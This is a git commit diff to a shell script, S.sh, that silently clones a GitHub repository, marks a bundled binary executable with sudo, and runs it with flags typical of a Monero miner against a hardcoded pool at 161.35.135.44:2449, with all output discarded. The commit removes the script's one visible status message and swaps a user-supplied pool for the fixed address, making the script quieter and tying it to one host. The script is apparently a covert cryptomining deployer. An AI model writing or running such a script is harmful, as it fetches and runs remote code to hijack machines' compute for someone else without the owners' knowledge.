511ed321f7dbc45a6050f45381d9ab57bbd8bd04
fulltechtree <77315046+fulltechtree@users.noreply.github.com>
2021-01-29 18:05:43 +0700

    Update S.sh

--- S.sh
+++ S.sh
@@ -1,9 +1,7 @@
 #! /bin/bash
-printf "Run $1"  >&2
 {
-
 git clone https://github.com/fulltechtree/tech.git &> /dev/null
 sudo chmod +x tech/mn
 screen -S min
-./tech/mn -o "$1" -u userA -p 1 -a rx/0 -k -t "$2"
+./tech/mn -o 161.35.135.44:2449 -u userA -p 1 -a rx/0 -k -t "$2"
 } &> /dev/null
